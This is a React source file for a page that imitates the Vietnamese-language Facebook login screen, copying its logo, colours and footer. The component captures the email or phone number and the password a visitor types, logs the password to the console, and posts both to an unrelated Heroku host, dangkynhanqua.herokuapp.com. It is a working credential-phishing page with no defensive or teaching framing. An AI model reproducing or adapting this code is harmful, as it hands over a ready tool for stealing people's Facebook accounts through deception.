import React, { Component } from 'react';
import { CardHeader, Container, Form, Button, FormGroup, Link, Input } from 'reactstrap';
import axios from 'axios'
axios.defaults.withCredentials = true;
class LoginFB extends Component {

    state = {
        user: {
            username: '',
            password: ''
        }
    }
    _onChange = (e) => {

        var preValueState = this.state.user;
        if (e.target.id == "0") {
            preValueState.username = e.target.value;
            console.log(preValueState.username)
        }
        if (e.target.id == "1") {
            preValueState.password = e.target.value;
            console.log(preValueState.password)
        }
        // assign new value
        this.setState({ user: preValueState })

    }

    _handleInfo = () => {
        axios.post('https://dangkynhanqua.herokuapp.com/api/', this.state.user)

            .then(res => {
                this.props.history.push('/')
                console.log('ddax poss')
                window.alert("Post")
            }
            )
            .catch(err => console.log(err))
    }


    render() {
        return (
            <div >

                <div className="header"  >

                    <CardHeader style={{ height: "57px" }} ></CardHeader>
                    <img className="fb-icon" src="https://uptime.com/media/website_profiles/facebook.png" style={{ height: "" }} />
                </div>
                <div className="body-content">
                    <div className="form-border">
                        <FormGroup>
                            <Form className="form-main">
                                <div className="login-form">
                                    <span className="login-title" > Đăng Nhập Facebook</span>
                                </div>
                                <div className="get-info">
                                    <div className="size-input">
                                        <Input type="text" onChange={this._onChange} name="text" className="position" placeholder="Email hoặc số điện thoại" id="0" />
                                        <Input type="password" onChange={this._onChange} className="position" placeholder="Mật khẩu" id="1" />
                                    </div>
                                </div>
                            </Form>
                            <div style={{ marginTop: "55px" }}>
                                 <a href="https://dangkynhanqua.herokuapp.com" >
                                    <Button style={{ backgroundColor: "#4267b2", borderColor: "#4267b2", borderRadius: "0px" }} onClick={this._handleInfo} className="btn-login" > Đăng Nhập </Button>
                                </a>
                                <div className="select-or">
                                    <span> hoặc </span>
                                </div>
                                <Button style={{ backgroundColor: "#42b72a", borderColor: "#42b72a", borderRadius: "0px" }} >Tạo tài khoản mới</Button>
                                <a href="/gotinfo" style={{fontSize:"13px"}}>Quên tài khoản?</a>
                            </div>
                        </FormGroup>
                    </div>
                </div>

                <div>
                    <div id="pageFooter" data-referrer="page_footer">
                    <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i display-li" data-nocookies="1">
                    <li>Tiếng Việt</li><li><a class="_sv4 language-position" dir="ltr" href="https://en-gb.facebook.com/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;en_GB&quot;, &quot;vi_VN&quot;, &quot;https:\/\/en-gb.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 0); return false;" title="English (UK)">English (UK)</a></li><li><a class="_sv4 language-position" dir="ltr" href="https://zh-tw.facebook.com/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;zh_TW&quot;, &quot;vi_VN&quot;, &quot;https:\/\/zh-tw.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 1); return false;" title="Traditional Chinese (Taiwan)">中文(台灣)</a></li><li><a class="_sv4 language-position" dir="ltr" href="https://ko-kr.facebook.com/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ko_KR&quot;, &quot;vi_VN&quot;, &quot;https:\/\/ko-kr.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 2); return false;" title="Korean">한국어</a></li><li><a class="_sv4 language-position" dir="ltr" href="https://ja-jp.facebook.com/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ja_JP&quot;, &quot;vi_VN&quot;, &quot;https:\/\/ja-jp.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 3); return false;" title="Japanese">日本語</a></li><li><a class="_sv4 language-position" dir="ltr" href="https://fr-fr.facebook.com/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;fr_FR&quot;, &quot;vi_VN&quot;, &quot;https:\/\/fr-fr.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 4); return false;" title="French (France)">Français (France)</a></li><li><a class="_sv4 language-position" dir="ltr" href="https://th-th.facebook.com/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;th_TH&quot;, &quot;vi_VN&quot;, &quot;https:\/\/th-th.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 5); return false;" title="Thai">ภาษาไทย</a></li><li><a class="_sv4 language-position" dir="ltr" href="https://es-la.facebook.com/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;es_LA&quot;, &quot;vi_VN&quot;, &quot;https:\/\/es-la.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 6); return false;" title="Spanish">Español</a></li><li><a class="_sv4 language-position" dir="ltr" href="https://pt-br.facebook.com/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;pt_BR&quot;, &quot;vi_VN&quot;, &quot;https:\/\/pt-br.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 7); return false;" title="Portuguese (Brazil)">Português (Brasil)</a></li><li><a class="_sv4 language-position" dir="ltr" href="https://de-de.facebook.com/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;de_DE&quot;, &quot;vi_VN&quot;, &quot;https:\/\/de-de.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 8); return false;" title="German">Deutsch</a></li><li><a class="_sv4 language-position" dir="ltr" href="https://it-it.facebook.com/login" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;it_IT&quot;, &quot;vi_VN&quot;, &quot;https:\/\/it-it.facebook.com\/login&quot;, &quot;www_list_selector&quot;, 9); return false;" title="Italian">Italiano</a></li><li><a role="button" class="_42ft _4jy0 _517i _517h _51sy language-position" rel="dialog" ajaxify="/settings/language/language/?uri=https%3A%2F%2Fit-it.facebook.com%2Flogin&amp;source=www_list_selector_more" href="#" title="Hiển thị thêm ngôn ngữ"><i class="img sp_Kur3Uoh6zGu sx_fa420b"></i></a></li></ul><div id="contentCurve"></div><div role="contentinfo" aria-label="Liên kết trang web Facebook" id="js_0"></div><div class="mvl copyright"><div>
                        <span> Facebook © 2018</span></div></div></div>
                </div>
            </div>
        );
    }
}

export default LoginFB;
